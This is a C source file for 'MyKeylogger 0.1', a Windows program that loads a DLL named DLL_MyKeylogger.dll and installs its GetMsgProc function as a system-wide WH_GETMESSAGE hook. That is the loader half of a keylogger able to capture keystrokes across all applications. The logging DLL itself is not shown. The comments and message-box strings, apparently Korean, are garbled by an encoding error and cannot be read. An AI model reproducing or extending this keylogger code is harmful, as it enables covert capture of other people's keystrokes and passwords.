/*******************************************************************
*
* MyKeylogger 0.1 (2012-08-01)
*
********************************************************************/

#include <windows.h>

LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, 
						 WPARAM wParam, LPARAM lParam ) 
{   
	static HINSTANCE hinstDll; // LoadLibrary() ���ϰ� ����
	HOOKPROC hGetMsgProc; // GetProcAddress(,) ���ϰ� ����
	static HHOOK hKeyHook; // SetWindowsHookEx(,,,) ���ϰ� ����

    switch( iMessage ) 
    { 
		case WM_CREATE: // ������ ������ ��ŷ ����: ���� ��ŷ�� ����� dll���� ����
			// 1. dll loaging
			hinstDll = LoadLibrary("DLL_MyKeylogger.dll"); // DLL�� �ε��Ѵ�.
            if(!hinstDll){
				MessageBox(hWnd, "MyKeylogger.dll�� �ε��� �� �����ϴ�.", "����", MB_OK);
				ExitProcess(1);
            }

			// 2. get point of function
            hGetMsgProc = (HOOKPROC)GetProcAddress(hinstDll, "GetMsgProc");          
            if(!hGetMsgProc){
                MessageBox(hWnd, "hGetMsgProc �Լ��� �ε��� �� �����ϴ�.", "����", MB_OK);
                FreeLibrary(hinstDll);
                ExitProcess(1);
            }

			// 3. set hooking
			hKeyHook = SetWindowsHookEx(WH_GETMESSAGE, hGetMsgProc, hinstDll, 0);
			// ��� �޼����� ���� hinstDll�� hGetMsgProc����
			if(!hKeyHook){
                MessageBox(hWnd, "Hooking�� �������� ���߽��ϴ�.", "����", MB_OK);
                FreeLibrary(hinstDll);
                ExitProcess(1);
            }
            break;
		case WM_DESTROY: 
			PostQuitMessage( 0 );             
    } 

    return DefWindowProc( hWnd, iMessage, wParam, lParam ); 
    // ������ ���ǵ��� ���� �޽����� �⺻���� ó��.
} 

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
				   LPSTR lpCmdLine, int nShowCmd) 
{
	HWND hWnd; // �޸𸮿� ������ â ������, �� ��ġ�� ������ ����
	MSG message; // �޼��� ����
	WNDCLASS wndclass; // ������

	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0; 
	// �� �ΰ��� �߰� �޸𸮸� ����ϰ��� �Ҷ� ����ϴ� ������
	// ���� ������� �ʴ´�.

	wndclass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
	// ���� ������ ���� ����: ȸ��

    wndclass.hCursor = LoadCursor( NULL, IDC_ARROW );        
    wndclass.hIcon =  LoadIcon( NULL, IDI_APPLICATION );
    wndclass.hInstance =  hInstance; 
    wndclass.lpfnWndProc = (WNDPROC)WndProc; // �ݹ��Լ� ���
    wndclass.lpszClassName =  "WG WINDOW";        
    wndclass.lpszMenuName = NULL;
    wndclass.style = NULL;

	RegisterClass( &wndclass ); // �����츦 ���

	hWnd = CreateWindow("WG WINDOW", "MyKeylogger 0.1", WS_OVERLAPPEDWINDOW, 
		200, 200, 500, 300, NULL, (HMENU)NULL, hInstance, NULL );        

	ShowWindow(hWnd, nShowCmd); // �����츦 ȭ�鿡 ���

	while( GetMessage( &message, NULL, 0, 0 ) ) {
		TranslateMessage( &message ); // �޽��� ����
		DispatchMessage( &message ); // �޽��� ó��
	}

	return message.wParam;
}



